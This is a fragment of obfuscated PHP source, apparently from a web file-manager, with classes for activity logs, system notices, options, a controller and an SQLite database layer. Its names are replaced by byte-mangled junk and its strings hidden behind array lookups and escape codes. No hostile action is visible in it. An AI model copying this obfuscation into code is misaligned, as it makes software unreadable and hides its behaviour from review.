LNG($±µú¾´·[2370]), $±µú¾´·[2371] => LNG($±µú¾´·[2372]), $±µú¾´·[2373] => LNG($±µú¾´·[2374]), $±µú¾´·[2375] => LNG($±µú¾´·[2376]), $±µú¾´·[2377] => LNG($±µú¾´·[2378]), $±µú¾´·[1964] => LNG($±µú¾´·[2378]), $±µú¾´·[1965] => LNG($±µú¾´·[2379]), $±µú¾´·[2380] => LNG($±µú¾´·[2381]), $±µú¾´·[2382] => LNG($±µú¾´·[2383]), $±µú¾´·[2384] => LNG($±µú¾´·[2385]), $±µú¾´·[2386] => LNG($±µú¾´·[2387]), $±µú¾´·[1962] => LNG($±µú¾´·[2388]), $±µú¾´·[2389] => LNG($±µú¾´·[2390]), $±µú¾´·[1969] => LNG($±µú¾´·[2391]), $±µú¾´·[2392] => LNG($±µú¾´·[2393]), $±µú¾´·[2394] => LNG($±µú¾´·[2395]), $±µú¾´·[2396] => LNG($±µú¾´·[2397]), $±µú¾´·[2398] => LNG($±µú¾´·[2399]), $±µú¾´·[1972] => LNG($±µú¾´·[2400]), $±µú¾´·[1973] => LNG($±µú¾´·[2401]), $±µú¾´·[2402] => LNG($±µú¾´·[2403]), $±µú¾´·[2404] => LNG($±µú¾´·[2405]), $±µú¾´·[2406] => LNG($±µú¾´·[2407]), $±µú¾´·[1967] => LNG($±µú¾´·[2408]), $±µú¾´·[2409] => LNG($±µú¾´·[2410]), $±µú¾´·[1966] => LNG($±µú¾´·[2411]), $±µú¾´·[2412] => LNG($±µú¾´·[2412]), $±µú¾´·[2413] => LNG($±µú¾´·[2414]), $±µú¾´·[2415] => LNG($±µú¾´·[2412]), $±µú¾´·[2416] => LNG($±µú¾´·[2417]), $±µú¾´·[2418] => LNG($±µú¾´·[2419]), $±µú¾´·[2420] => LNG($±µú¾´·[2419]), $±µú¾´·[2421] => LNG($±µú¾´·[2422]), $±µú¾´·[2423] => LNG($±µú¾´·[2423]), $±µú¾´·[2424] => LNG($±µú¾´·[1938]), $±µú¾´·[2425] => LNG($±µú¾´·[2426]), $±µú¾´·[2427] => LNG($±µú¾´·[2428]), $±µú¾´·[2429] => LNG($±µú¾´·[2430]), $±µú¾´·[2431] => LNG($±µú¾´·[2432]), $±µú¾´·[2433] => LNG($±µú¾´·[2434]), $±µú¾´·[2435] => LNG($±µú¾´·[2435]), $±µú¾´·[2436] => LNG($±µú¾´·[2437]), $±µú¾´·[2438] => LNG($±µú¾´·[2439]), $±µú¾´·[2440] => LNG($±µú¾´·[2441]), $±µú¾´·[2442] => LNG($±µú¾´·[2443]), $±µú¾´·[2444] => LNG($±µú¾´·[2445]), $±µú¾´·[2446] => LNG($±µú¾´·[2447]), $±µú¾´·[213] => LNG($±µú¾´·[213]), $±µú¾´·[214] => LNG($±µú¾´·[2448]), $±µú¾´·[2449] => LNG($±µú¾´·[2449])); } private function typeFile() { $· ªøµå =& $_SERVER[‹‰”››ê]; $À„ÓšÇÜ = array($· ªøµå[1969] => array($· ªøµå[1970]), $· ªøµå[2384] => array($· ªøµå[2450]), $· ªøµå[2386] => array($· ªøµå[2451]), $· ªøµå[1962] => array($· ªøµå[1963], $· ªøµå[2452]), $· ªøµå[2394] => array(), $· ªøµå[2396] => array(), $· ªøµå[2398] => array(), $· ªøµå[1972] => array($· ªøµå[1974]), $· ªøµå[1973] => array($· ªøµå[1974]), $· ªøµå[2402] => array($· ªøµå[2453]), $· ªøµå[2404] => array($· ªøµå[2453]), $· ªøµå[2406] => array($· ªøµå[2454]), $· ªøµå[2392] => array($· ªøµå[2455]), $· ªøµå[1967] => array($· ªøµå[2456]), $· ªøµå[2409] => array($· ªøµå[2457]), $· ªøµå[1966] => array($· ªøµå[1968])); return $À„ÓšÇÜ; } private function typeAll() { $¥ÂµÓ°° =& $_SERVER[‹‰”››ê]; $ÕÚûŒ¥ = $this->typeList; $œ–»­‹Á = array_filter($this->typeFile()); foreach ($œ–»­‹Á as $ŸáÒÈ£¸ => $õÏîèˆú) { $ÕÚûŒ¥[$õÏîèˆú[0]] = $ÕÚûŒ¥[$ŸáÒÈ£¸]; } $ÕÚûŒ¥[$¥ÂµÓ°°[1974]] = LNG($¥ÂµÓ°°[2458]); $ÕÚûŒ¥[$¥ÂµÓ°°[2453]] = LNG($¥ÂµÓ°°[2459]); return $ÕÚûŒ¥; } public function addLog($Éå•¬Ì°, $¨¿ä’ÇÓ = array()) { $—–ÂÇ‹ =& $_SERVER[‹‰”››ê]; if (!isset($this->typeList[$Éå•¬Ì°])) { return; } $ÎÜã¿• = Session::get($—–ÂÇ‹[2133]); if (!$ÎÜã¿•) { $ÎÜã¿• = _get($¨¿ä’ÇÓ, $—–ÂÇ‹[1791], 0); } if ($Éå•¬Ì° == $—–ÂÇ‹[2425] && is_array($¨¿ä’ÇÓ[$—–ÂÇ‹[2460]]) && !$¨¿ä’ÇÓ[$—–ÂÇ‹[2460]]) { return; } $ÙëÑğ¾ô = get_client_ip(); if (!$¨¿ä’ÇÓ || strlen(json_encode($¨¿ä’ÇÓ)) >= 1024 * 64) { if ($¨¿ä’ÇÓ && is_array($¨¿ä’ÇÓ)) { $¨¿ä’ÇÓ = array_intersect_key($¨¿ä’ÇÓ, array_flip($—–ÂÇ‹[487], $—–ÂÇ‹[32])); $¨¿ä’ÇÓ[$—–ÂÇ‹[2461]] = $ÙëÑğ¾ô; } else { $¨¿ä’ÇÓ = array($—–ÂÇ‹[2461] => $ÙëÑğ¾ô); } } else { if (is_array($¨¿ä’ÇÓ)) { $¨¿ä’ÇÓ[$—–ÂÇ‹[2461]] = $ÙëÑğ¾ô; } else { $¨¿ä’ÇÓ = array($—–ÂÇ‹[1303] => $¨¿ä’ÇÓ, $—–ÂÇ‹[2461] => $ÙëÑğ¾ô); } } $¨¿ä’ÇÓ = array($—–ÂÇ‹[1781] => Session::sign(), $—–ÂÇ‹[1782] => intval($ÎÜã¿•), $—–ÂÇ‹[33] => $Éå•¬Ì°, $—–ÂÇ‹[1784] => json_encode($¨¿ä’ÇÓ)); return parent::add($¨¿ä’ÇÓ); } public function remove($ºüú—âê) { $this->where(array($_SERVER[‹‰”››ê][505] => $ºüú—âê))->delete(); } private function _makeOrder($ô±ÙÑ°ã = '') { $¶ÂéÔ£Î =& $_SERVER[‹‰”››ê]; $ˆæÀãÒİ = $¶ÂéÔ£Î[234]; $’á‰®ó = array($¶ÂéÔ£Î[535] => $¶ÂéÔ£Î[536], $¶ÂéÔ£Î[537] => $¶ÂéÔ£Î[538]); $òÖĞç¸Œ = Input::get($¶ÂéÔ£Î[543], $¶ÂéÔ£Î[7], $¶ÂéÔ£Î[2173], array($¶ÂéÔ£Î[2087], $¶ÂéÔ£Î[537])); $òÖĞç¸Œ = $’á‰®ó[$òÖĞç¸Œ]; $ô±ÙÑ°ã = $ô±ÙÑ°ã . "{$ˆæÀãÒİ}\x20{$òÖĞç¸Œ}"; return $this->order($ô±ÙÑ°ã); } public function get($Áä«íÀ° = '') { $ÙÁÑè±ª =& $_SERVER[‹‰”››ê]; if (!$Áä«íÀ°) { show_json(array()); } $ôãÃ³¿³ = array(); if ($Áä«íÀ°[$ÙÁÑè±ª[1791]]) { $ôãÃ³¿³[$ÙÁÑè±ª[1791]] = $Áä«íÀ°[$ÙÁÑè±ª[1791]]; } if (isset($Áä«íÀ°[$ÙÁÑè±ª[850]])) { $ó†€× = $Áä«íÀ°[$ÙÁÑè±ª[850]]; $åÓÈÓ— = isset($Áä«íÀ°[$ÙÁÑè±ª[851]]) ? $Áä«íÀ°[$ÙÁÑè±ª[851]] : time(); $ôãÃ³¿³[$ÙÁÑè±ª[234]] = array($ÙÁÑè±ª[420], array($ó†€×, $åÓÈÓ—)); } if ($Áä«íÀ°[$ÙÁÑè±ª[33]]) { $¯ßÇà‹Û = explode($ÙÁÑè±ª[50], $Áä«íÀ°[$ÙÁÑè±ª[33]]); $Äç›ƒ¼Û = $this->typeFile(); $şÇó”Ë‘ = array(); foreach ($¯ßÇà‹Û as $»¹ıÉİ·) { $şÇó”Ë‘[] = $»¹ıÉİ·; if (isset($Äç›ƒ¼Û[$»¹ıÉİ·])) { $şÇó”Ë‘ = array_merge($şÇó”Ë‘, $Äç›ƒ¼Û[$»¹ıÉİ·]); } } $şÇó”Ë‘ = array_unique($şÇó”Ë‘); if ($şÇó”Ë‘) { $ôãÃ³¿³[$ÙÁÑè±ª[33]] = array($ÙÁÑè±ª[7], $şÇó”Ë‘); } } else { $ôãÃ³¿³[$ÙÁÑè±ª[33]] = array($ÙÁÑè±ª[2462], $ÙÁÑè±ª[2463]); } if (!empty($Áä«íÀ°[$ÙÁÑè±ª[2461]])) { $ôãÃ³¿³[$ÙÁÑè±ª[538]] = array($ÙÁÑè±ª[471], "\45{$Áä«íÀ°[$ÙÁÑè±ª[2461]]}\45"); } $ÛÏŞÌû¡ = $this->_makeOrder()->where($ôãÃ³¿³)->selectPage(); if (empty($ÛÏŞÌû¡[$ÙÁÑè±ª[457]])) { show_json(array(), !0, $ÛÏŞÌû¡[$ÙÁÑè±ª[454]]); } $ÛÏŞÌû¡[$ÙÁÑè±ª[457]] = $this->logList($ÛÏŞÌû¡[$ÙÁÑè±ª[457]]); return $ÛÏŞÌû¡; } private function ipAddress(&$’éáûÆ²) { $Áı´õŒˆ =& $_SERVER[‹‰”››ê]; if (!empty($’éáûÆ²[$Áı´õŒˆ[2461]])) { $×÷°óê¤ = IpLocation::get($’éáûÆ²[$Áı´õŒˆ[2461]]); } else { $×÷°óê¤ = LNG($Áı´õŒˆ[2464]); } $’éáûÆ²[$Áı´õŒˆ[2465]] = $×÷°óê¤; } private function descZipDownload($îì¡„œÓ, &$š®ÕÏÇ) { $½ê§£úÛ =& $_SERVER[‹‰”››ê]; if (!isset($îì¡„œÓ[$½ê§£úÛ[2466]])) { return; } $£ë¹«‘ç = json_decode($îì¡„œÓ[$½ê§£úÛ[2466]], !0); foreach ($£ë¹«‘ç as $­­ÌÙš‘) { try { $ÄéÁõ­à = IO::infoFullSimple($­­ÌÙš‘[$½ê§£úÛ[87]]); } catch (Exception $¼óÜÑÛÎ) { continue; } $îì¡„œÓ[$½ê§£úÛ[87]] = $­­ÌÙš‘[$½ê§£úÛ[87]]; $š®ÕÏÇ[] = $îì¡„œÓ[$½ê§£úÛ[194]] = $ÄéÁõ­à[$½ê§£úÛ[194]]; $š®ÕÏÇ[] = $îì¡„œÓ[$½ê§£úÛ[2229]] = $ÄéÁõ­à[$½ê§£úÛ[193]]; break; } return $îì¡„œÓ; } private function getSourceList(&$„¼û›ã—) { $ôâ™‘±á =& $_SERVER[‹‰”››ê]; $ûìõÒö€ = array(); foreach ($„¼û›ã— as $’Íæµö© => $áúÒ‹÷Ç) { $ú»–ò´ = json_decode($áúÒ‹÷Ç[$ôâ™‘±á[538]], !0); if ($áúÒ‹÷Ç[$ôâ™‘±á[33]] == $ôâ™‘±á[1965]) { $ú»–ò´ = $this->descZipDownload($ú»–ò´, $ûìõÒö€); $„¼û›ã—[$’Íæµö©][$ôâ™‘±á[538]] = json_encode($ú»–ò´); continue; } if (strpos($áúÒ‹÷Ç[$ôâ™‘±á[33]], $ôâ™‘±á[2231]) !== 0) { if (!isset($ú»–ò´[$ôâ™‘±á[87]]) || strpos($áúÒ‹÷Ç[$ôâ™‘±á[33]], $ôâ™‘±á[2467]) !== 0) { continue; } try { $¢¸ƒ¸­ = IO::infoFullSimple($ú»–ò´[$ôâ™‘±á[87]]); } catch (Exception $½ı›¿™“) { continue; } $ûìõÒö€[] = $ú»–ò´[$ôâ™‘±á[194]] = $¢¸ƒ¸­[$ôâ™‘±á[194]]; $ûìõÒö€[] = $ú»–ò´[$ôâ™‘±á[2229]] = $¢¸ƒ¸­[$ôâ™‘±á[193]]; $„¼û›ã—[$’Íæµö©][$ôâ™‘±á[538]] = json_encode($ú»–ò´); continue; } $ûìõÒö€[] = $ú»–ò´[$ôâ™‘±á[194]]; $ûìõÒö€[] = $ú»–ò´[$ôâ™‘±á[2229]]; if ($ú»–ò´[$ôâ™‘±á[33]] == $ôâ™‘±á[637]) { $ûìõÒö€[] = $ú»–ò´[$ôâ™‘±á[538]][$ôâ™‘±á[1257]]; $ûìõÒö€[] = $ú»–ò´[$ôâ™‘±á[538]][$ôâ™‘±á[1258]]; } if ($ú»–ò´[$ôâ™‘±á[33]] == $ôâ™‘±á[2240]) { $ûìõÒö€[] = $ú»–ò´[$ôâ™‘±á[538]][$ôâ™‘±á[194]]; } } if (!$ûìõÒö€) { return array(); } return Model($ôâ™‘±á[920])->sourceListInfo($ûìõÒö€, !0); } private function logList($™ô´±ı©) { $½ğÀÇ¹– =& $_SERVER[‹‰”››ê]; $«üüŞØß = array_to_keyvalue($™ô´±ı©, $½ğÀÇ¹–[12], $½ğÀÇ¹–[1791]); $ÁÒ©­ı = Model($½ğÀÇ¹–[611])->userListInfo(array_unique($«üüŞØß)); $øõÓü…Ş = $this->getSourceList($™ô´±ı©); $Á˜»Øí = $this->typeAll(); $‰¢””îù = array(); $Úö„ôàÒ = array(); foreach ($™ô´±ı© as $¾İÑÄéš => $òâ’´ŠÛ) { $¶ˆŒµì = $òâ’´ŠÛ[$½ğÀÇ¹–[33]]; $³¶Õáı· = isset($ÁÒ©­ı[$òâ’´ŠÛ[$½ğÀÇ¹–[1791]]]) ? $ÁÒ©­ı[$òâ’´ŠÛ[$½ğÀÇ¹–[1791]]] : !1; $Âş¾ÔÓŠ = strpos($¶ˆŒµì, $½ğÀÇ¹–[2468]) === 0 ? LNG($½ğÀÇ¹–[2469]) : LNG($½ğÀÇ¹–[2464]); $òâ’´ŠÛ[$½ğÀÇ¹–[32]] = isset($³¶Õáı·[$½ğÀÇ¹–[32]]) ? $³¶Õáı·[$½ğÀÇ¹–[32]] : LNG($½ğÀÇ¹–[2464]); $òâ’´ŠÛ[$½ğÀÇ¹–[2291]] = isset($³¶Õáı·[$½ğÀÇ¹–[2291]]) ? $³¶Õáı·[$½ğÀÇ¹–[2291]] : $½ğÀÇ¹–[12]; $òâ’´ŠÛ[$½ğÀÇ¹–[1677]] = isset($Á˜»Øí[$¶ˆŒµì]) ? $Á˜»Øí[$¶ˆŒµì] : $Âş¾ÔÓŠ; $òâ’´ŠÛ[$½ğÀÇ¹–[2172]] = $³¶Õáı·; $Ë´”Ûµˆ = json_decode($òâ’´ŠÛ[$½ğÀÇ¹–[538]], !0); $òâ’´ŠÛ[$½ğÀÇ¹–[2461]] = isset($Ë´”Ûµˆ[$½ğÀÇ¹–[2461]]) ? $Ë´”Ûµˆ[$½ğÀÇ¹–[2461]] : $½ğÀÇ¹–[12]; $òâ’´ŠÛ[$½ğÀÇ¹–[2465]] = IpLocation::get($òâ’´ŠÛ[$½ğÀÇ¹–[2461]]); if (strpos($¶ˆŒµì, $½ğÀÇ¹–[2231]) === 0 || isset($Ë´”Ûµˆ[$½ğÀÇ¹–[2229]])) { $Ë´”Ûµˆ[$½ğÀÇ¹–[90]] = $øõÓü…Ş[$Ë´”Ûµˆ[$½ğÀÇ¹–[194]]]; $Ë´”Ûµˆ[$½ğÀÇ¹–[2245]] = $øõÓü…Ş[$Ë´”Ûµˆ[$½ğÀÇ¹–[2229]]]; if ($Ë´”Ûµˆ[$½ğÀÇ¹–[33]] == $½ğÀÇ¹–[637]) { $Ë´”Ûµˆ[$½ğÀÇ¹–[538]][$½ğÀÇ¹–[1257]] = $øõÓü…Ş[$Ë´”Ûµˆ[$½ğÀÇ¹–[538]][$½ğÀÇ¹–[1257]]]; $Ë´”Ûµˆ[$½ğÀÇ¹–[538]][$½ğÀÇ¹–[1258]] = $øõÓü…Ş[$Ë´”Ûµˆ[$½ğÀÇ¹–[538]][$½ğÀÇ¹–[1258]]]; } if ($Ë´”Ûµˆ[$½ğÀÇ¹–[33]] == $½ğÀÇ¹–[2240]) { $Ë´”Ûµˆ[$½ğÀÇ¹–[538]][$½ğÀÇ¹–[194]] = $øõÓü…Ş[$Ë´”Ûµˆ[$½ğÀÇ¹–[538]][$½ğÀÇ¹–[194]]]; } if ($Ë´”Ûµˆ[$½ğÀÇ¹–[33]] == $½ğÀÇ¹–[1960]) { $Ë´”Ûµˆ[$½ğÀÇ¹–[2245]] = $Ë´”Ûµˆ[$½ğÀÇ¹–[90]]; $Ë´”Ûµˆ[$½ğÀÇ¹–[2229]] = $Ë´”Ûµˆ[$½ğÀÇ¹–[2245]][$½ğÀÇ¹–[194]]; $Ë´”Ûµˆ[$½ğÀÇ¹–[90]] = !1; $Ë´”Ûµˆ[$½ğÀÇ¹–[194]] = $½ğÀÇ¹–[12]; } $®ıŞÍ = array($½ğÀÇ¹–[1960], $½ğÀÇ¹–[2227]); if (!in_array($Ë´”Ûµˆ[$½ğÀÇ¹–[33]], $®ıŞÍ)) { if ($Ë´”Ûµˆ[$½ğÀÇ¹–[90]] && $Ë´”Ûµˆ[$½ğÀÇ¹–[90]][$½ğÀÇ¹–[191]] == $½ğÀÇ¹–[192]) { $Úö„ôàÒ[] = $òâ’´ŠÛ[$½ğÀÇ¹–[487]]; unset($™ô´±ı©[$¾İÑÄéš]); continue; } if ($Ë´”Ûµˆ[$½ğÀÇ¹–[2245]] && $Ë´”Ûµˆ[$½ğÀÇ¹–[2245]][$½ğÀÇ¹–[191]] == $½ğÀÇ¹–[192]) { $Úö„ôàÒ[] = $òâ’´ŠÛ[$½ğÀÇ¹–[487]]; unset($™ô´±ı©[$¾İÑÄéš]); continue; } } } $òâ’´ŠÛ[$½ğÀÇ¹–[538]] = $Ë´”Ûµˆ; unset($òâ’´ŠÛ[$½ğÀÇ¹–[2470]]); $‰¢””îù[] = $òâ’´ŠÛ; } $this->clearSystemPathLog($Úö„ôàÒ); return $‰¢””îù; } private function clearSystemPathLog($¿á÷Ï¾ï) { $¾Æ»“î =& $_SERVER[‹‰”››ê]; if (count($¿á÷Ï¾ï) == 0) { return; } $¸Ü£øøÀ = array($¾Æ»“î[487] => array($¾Æ»“î[7], array_unique($¿á÷Ï¾ï))); $this->where($¸Ü£øøÀ)->delete(); } public function deviceList($ÀÊ ’˜, $­„œ¢Íä = 0) { $é­ùºæ˜ =& $_SERVER[‹‰”››ê]; $œ©š¡ü© = array($é­ùºæ˜[1791] => $ÀÊ ’˜, $é­ùºæ˜[234] => array($é­ùºæ˜[1107], $­„œ¢Íä), $é­ùºæ˜[33] => $é­ùºæ˜[1934]); $ıç°ÇØ³ = array(); $Ğ¾¬½šª = $this->field($é­ùºæ˜[2471])->where($œ©š¡ü©)->order($é­ùºæ˜[2243])->limit(50)->select(); foreach ($Ğ¾¬½šª as $Ú´åÕ÷ò => $ğ²Û÷î) { if ($Ú´åÕ÷ò > 0 && abs($ğ²Û÷î[$é­ùºæ˜[234]] - $Ğ¾¬½šª[$Ú´åÕ÷ò - 1][$é­ùºæ˜[234]]) < 5) { continue; } $üûıµÌ˜ = json_decode($ğ²Û÷î[$é­ùºæ˜[538]], !0); $ğ²Û÷î[$é­ùºæ˜[2461]] = isset($üûıµÌ˜[$é­ùºæ˜[2461]]) ? $üûıµÌ˜[$é­ùºæ˜[2461]] : $é­ùºæ˜[12]; unset($üûıµÌ˜[$é­ùºæ˜[2461]]); $Ëã—ñÆÂ = $this->deviceType($üûıµÌ˜[$é­ùºæ˜[2232]]); if (isset($ıç°ÇØ³[$Ëã—ñÆÂ])) { continue; } $ğ²Û÷î[$é­ùºæ˜[2465]] = IpLocation::get($ğ²Û÷î[$é­ùºæ˜[2461]]); $ğ²Û÷î[$é­ùºæ˜[538]] = $üûıµÌ˜; $ıç°ÇØ³[$Ëã—ñÆÂ] = $ğ²Û÷î; } return array_values($ıç°ÇØ³); } public function deviceType($Ï»‚Áû€) { return $Ï»‚Áû€; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\x6e\157\x74\x69\143\x65\x4c\151\x73\164"; public $field = array("\156\141\x6d\x65", "\143\x6f\x6e\164\x65\156\x74", "\141\x75\x74\150", "\155\157\144\x65", "\x74\x69\x6d\x65", "\164\x79\160\145", "\x6c\145\166\145\154", "\145\x6e\141\x62\x6c\145", "\163\157\162\164"); public function listData($¦ñ§¨¢¢ = false, $Í´ñËŠï = "\163\x6f\162\164", $òÓëÛ’° = false) { return parent::listData($¦ñ§¨¢¢, $Í´ñËŠï, $òÓëÛ’°); } public function add($“ÊŸàƒ¤) { $¸†ö°º¾ =& $_SERVER[‹‰”››ê]; $‘œÒì† = time(); if ($“ÊŸàƒ¤[$¸†ö°º¾[16]] == $¸†ö°º¾[2472]) { $‘œÒì† = strtotime($“ÊŸàƒ¤[$¸†ö°º¾[207]]); } $“ÊŸàƒ¤[$¸†ö°º¾[207]] = $‘œÒì†; return parent::insert($“ÊŸàƒ¤); } public function update($Şû……ç, $ÔŸï·÷) { $í›¯†¨Í =& $_SERVER[‹‰”››ê]; $œÔ»‹ŒÎ = $this->listData($Şû……ç); if (!$œÔ»‹ŒÎ) { return !1; } $Ñ¢Ûóö = time(); if ($ÔŸï·÷[$í›¯†¨Í[16]] == $í›¯†¨Í[2472]) { $Ñ¢Ûóö = strtotime($ÔŸï·÷[$í›¯†¨Í[207]]); } $ÔŸï·÷[$í›¯†¨Í[207]] = $Ñ¢Ûóö; return parent::update($Şû……ç, $ÔŸï·÷); } public function remove($ã™ĞóĞ£) { $ÕÖĞ•®± = $this->listData($ã™ĞóĞ£); if (!$ÕÖĞ•®± || $ÕÖĞ•®±[$_SERVER[‹‰”››ê][192]]) { return !1; } return parent::remove($ã™ĞóĞ£); } public function sort($îõäŠĞ, $¦Š¿áöı) { return parent::update($îõäŠĞ, $¦Š¿áöı); } public function enable($ÍÊ¶…ˆ, $••©ğ·â) { return parent::update($ÍÊ¶…ˆ, array($_SERVER[‹‰”››ê][2473] => $••©ğ·â)); } private function initUserOption() { $û¨šŒ’ =& $_SERVER[‹‰”››ê]; $this->optionType = $û¨šŒ’[2474]; $this->modelType = $û¨šŒ’[2475]; $this->field = array($û¨šŒ’[2476], $û¨šŒ’[32], $û¨šŒ’[207], $û¨šŒ’[33], $û¨šŒ’[2477], $û¨šŒ’[840], $û¨šŒ’[229]); } public function userNoticeGet($ß¹‘·°ƒ = false) { $this->initUserOption(); return parent::listData($ß¹‘·°ƒ, $_SERVER[‹‰”››ê][487], !0); } public function userNoticeAdd($‹ª²êÓÜ) { $»…£ƒÊ =& $_SERVER[‹‰”››ê]; $this->initUserOption(); $úŠ¨ÄÇ² = $this->findByKey($»…£ƒÊ[2476], $‹ª²êÓÜ[$»…£ƒÊ[487]]); if ($úŠ¨ÄÇ²) { return !0; } $Ï’Î«Òå = array($»…£ƒÊ[2476] => $‹ª²êÓÜ[$»…£ƒÊ[487]], $»…£ƒÊ[32] => $‹ª²êÓÜ[$»…£ƒÊ[32]], $»…£ƒÊ[207] => $‹ª²êÓÜ[$»…£ƒÊ[207]], $»…£ƒÊ[33] => isset($‹ª²êÓÜ[$»…£ƒÊ[33]]) ? $‹ª²êÓÜ[$»…£ƒÊ[33]] : 1, $»…£ƒÊ[2477] => isset($‹ª²êÓÜ[$»…£ƒÊ[2477]]) ? $‹ª²êÓÜ[$»…£ƒÊ[2477]] : 0, $»…£ƒÊ[840] => 0, $»…£ƒÊ[229] => 0); return parent::insert($Ï’Î«Òå); } public function userNoticeEdit($¹Ş»ÆÂ, $†ÈÁ’á­) { $this->initUserOption(); return parent::update($¹Ş»ÆÂ, $†ÈÁ’á­); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\164\x65\x6d\137\157\x70\164\x69\157\x6e"; protected $jsonField = array("\155\145\x6e\165", "\x72\x6f\x6c\145", "\x72\157\x6c\145\x47\x72\x6f\165\x70", "\x72\x65\147\151\x73\164", "\x65\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($¾ÖÙ­¬) { return "\x53\171\x73\x74\145\155\117\x70\164\151\157\x6e\x5f{$¾ÖÙ­¬}"; } protected function optionDefault($Ãå•ñ÷Á = '') { $õş˜¬„‹ =& $_SERVER[‹‰”››ê]; if ($Ãå•ñ÷Á == $õş˜¬„‹[12]) { return $GLOBALS[$õş˜¬„‹[6]][$õş˜¬„‹[469]]; } } } goto a„–Œ—Ëº¨; aÓôÅ¥’Ï: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $â÷±îäæ =& $_SERVER[‹‰”››ê]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$â÷±îäæ[6]] =& $config; $this->values[$â÷±îäæ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $â÷±îäæ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ñ¯²Åùí) { if (1 === func_num_args()) { $this->{$Ñ¯²Åùí} = new $Ñ¯²Åùí(); } else { $¼ŒŸ»áç = new ReflectionClass($Ñ¯²Åùí); $‡•Œõ¡‹ = func_get_args(); array_shift($‡•Œõ¡‹); $this->{$Ñ¯²Åùí} = $¼ŒŸ»áç->newInstanceArgs($‡•Œõ¡‹); } return $this->{$Ñ¯²Åùí}; } public function routeBind($¥ä·°ùÕ, $Ê±ŠÖ, $íæÍ‹ŠÈ = 3) { $Õò¨•¦¶ =& $_SERVER[‹‰”››ê]; $òÊ±éß = $this->in[$Õò¨•¦¶[9]]; $¥ä·°ùÕ = str_replace($Õò¨•¦¶[10], $Õò¨•¦¶[11], trim(trim($¥ä·°ùÕ, $Õò¨•¦¶[8]), $Õò¨•¦¶[12])); if (!$¥ä·°ùÕ || count($òÊ±éß) <= $íæÍ‹ŠÈ) { return !1; } $È—ÓÍ¤Ş = !0; $‚—¾¿¿  = explode($Õò¨•¦¶[8], $¥ä·°ùÕ); for ($­Õï›½­ = 0; $­Õï›½­ < count($‚—¾¿¿ ); $­Õï›½­++) { if ($‚—¾¿¿ [$­Õï›½­] != $òÊ±éß[$íæÍ‹ŠÈ + $­Õï›½­]) { $È—ÓÍ¤Ş = !1; break; } } if (!$È—ÓÍ¤Ş) { return; } call_user_func_array(array($this, $Ê±ŠÖ), array()); } public function routeArgs($Àœğ„î = 3) { $şÜı¹é  = $this->in[$_SERVER[‹‰”››ê][9]]; if (count($şÜı¹é ) <= $Àœğ„î) { return array(); } $É¶ÆˆÎï = array(); for ($ß¹ÎºÍä = $Àœğ„î; $ß¹ÎºÍä < count($şÜı¹é ); $ß¹ÎºÍä += 2) { $É¶ÆˆÎï[$şÜı¹é [$ß¹ÎºÍä]] = $şÜı¹é [$ß¹ÎºÍä + 1]; $this->in[$şÜı¹é [$ß¹ÎºÍä]] = $şÜı¹é [$ß¹ÎºÍä + 1]; } return $É¶ÆˆÎï; } protected function assign($Ø°éÅ‘¡, $ÉêáãÉ´) { $this->values[$Ø°éÅ‘¡] = $ÉêáãÉ´; } protected function display($†Í‰ôˆİ) { ob_end_clean(); extract($this->values); require $this->tpl . $†Í‰ôˆİ; } } class DbSqliteBase extends Db { public function __construct($Å¡ß³ğ¥ = '') { $Ÿ’ô¾»Ñ =& $_SERVER[‹‰”››ê]; if (!extension_loaded($Ÿ’ô¾»Ñ[13])) { think_exception(think_lang($Ÿ’ô¾»Ñ[14]) . $Ÿ’ô¾»Ñ[15]); } if (!empty($Å¡ß³ğ¥)) { if (!isset($Å¡ß³ğ¥[$Ÿ’ô¾»Ñ[16]])) { $Å¡ß³ğ¥[$Ÿ’ô¾»Ñ[16]] = 438; } $this->config = $Å¡ß³ğ¥; if (empty($this->config[$Ÿ’ô¾»Ñ[17]])) { $this->config[$Ÿ’ô¾»Ñ[17]] = array(); } } } public function connect($èÈ‘¿š” = '', $ùÚöÔ÷  = 0) { $—¶êÙä =& $_SERVER[‹‰”››ê]; if (!isset($this->linkID[$ùÚöÔ÷ ])) { if (empty($èÈ‘¿š”)) { $èÈ‘¿š” = $this->config; } $¢¢´÷êé = !empty($èÈ‘¿š”[$—¶êÙä[17]][$—¶êÙä[18]]) ? $èÈ‘¿š”[$—¶êÙä[17]][$—¶êÙä[18]] : $this->pconnect; $ÏÕåÎä = $¢¢´÷êé ? $—¶êÙä[19] : $—¶êÙä[20]; $this->linkID[$ùÚöÔ÷ ] = $ÏÕåÎä($èÈ‘¿š”[$—¶êÙä[21]], $èÈ‘¿š”[$—¶êÙä[16]]); if (!$this->linkID[$ùÚöÔ÷ ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ùÚöÔ÷ ], 30000); if (1 != think_config($—¶êÙä[22])) { unset($this->config); } } return $this->linkID[$ùÚöÔ÷ ]; } public function free() { $this->queryID = null; } public function query($¿öïÑ„Ô) { $ñŒ•Ë¬Á =& $_SERVER[‹‰”››ê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¿öïÑ„Ô; if ($this->queryID) { $this->free(); } think_action_status($ñŒ•Ë¬Á[23], 1); think_status($ñŒ•Ë¬Á[24]); $this->queryID = sqlite_query($this->_linkID, $¿öïÑ„Ô); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Óƒ›ï¡é = $this->getAll(); return $Óƒ›ï¡é; } } public function execute($–ğë½Å­) { $‡Ü±²¥™ =& $_SERVER[‹‰”››ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $–ğë½Å­; if ($this->queryID) { $this->free(); } think_action_status($‡Ü±²¥™[25], 1); think_status($‡Ü±²¥™[24]); $Òäñ¶€Ì = sqlite_exec($this->_linkID, $–ğë½Å­); $this->debug(); if (!1 === $Òäñ¶€Ì) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return 